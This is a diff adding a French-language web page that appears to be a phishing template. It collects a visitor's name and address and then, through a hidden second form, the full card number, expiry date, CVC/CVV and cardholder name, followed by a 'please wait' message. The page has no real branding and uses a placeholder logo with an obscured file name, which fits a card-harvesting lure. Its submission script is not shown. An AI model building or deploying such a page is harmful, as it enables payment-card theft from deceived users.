@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enregistrement des informations</title>
+    <link rel="stylesheet" href="styles.css"> <!-- Lien vers le fichier CSS -->
+</head>
+<body>
+    <header>
+        <h1>Enregistrement des informations</h1>
+        <img src="_5ZTQ4YTBkNzAyNDMxYzJhNDEzNGZmN2E2NmY2ZTk4OTkuUE5Hpng.png" alt="Logo de votre site" id="logo"> <!-- Chemin vers votre logo -->
+    </header>
+    <form id="personalInfoForm" action="#" method="POST">
+        <h2>Informations Personnelles</h2>
+        <label for="firstName">Prénom <span>*</span></label>
+        <input type="text" id="firstName" name="firstName" placeholder="Ex: Jean" required>
+        <label for="lastName">Nom <span>*</span></label>
+        <input type="text" id="lastName" name="lastName" placeholder="Ex: Dupont" required>
+        <label for="street">Rue et numéro de maison <span>*</span></label>
+        <input type="text" id="street" name="street" placeholder="Ex: Rue de la Liberté 123" required>
+        <label for="postalCode">Code Postal <span>*</span></label>
+        <input type="text" id="postalCode" name="postalCode" placeholder="Ex: 1000" required>
+        <label for="city">Ville <span>*</span></label>
+        <input type="text" id="city" name="city" placeholder="Ex: Bruxelles" required>
+        <input type="submit" value="Compléter les informations">
+    </form>
+
+    <form id="bankInfoForm" action="#" method="POST" style="display: none;">
+        <h2>Informations Bancaires</h2>
+        <label for="cardNumber">Numéro de Carte <span>*</span></label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="Ex: 1234 5678 9012 3456" required>
+        <label for="expirationDate">Date d'Expiration <span>*</span></label>
+        <input type="text" id="expirationDate" name="expirationDate" placeholder="Ex: 01/23" required>
+        <label for="cvc">CVC/CVV <span>*</span></label>
+        <input type="text" id="cvc" name="cvc" placeholder="Ex: 123" required>
+        <label for="cardName">Nom sur la Carte <span>*</span></label>
+        <input type="text" id="cardName" name="cardName" placeholder="Ex: Jean Dupont" required>
+        <input type="submit" value="Finaliser l'enregistrement">
+    </form>
+
+    <!-- Ajout du message de chargement -->
+    <div id="loadingMessage" style="display: none;">
+        <p>Veuillez patienter...</p>
+    </div>
+
+    <script src="script.js"></script> <!-- Lien vers le fichier JavaScript -->
+</body>
+</html>
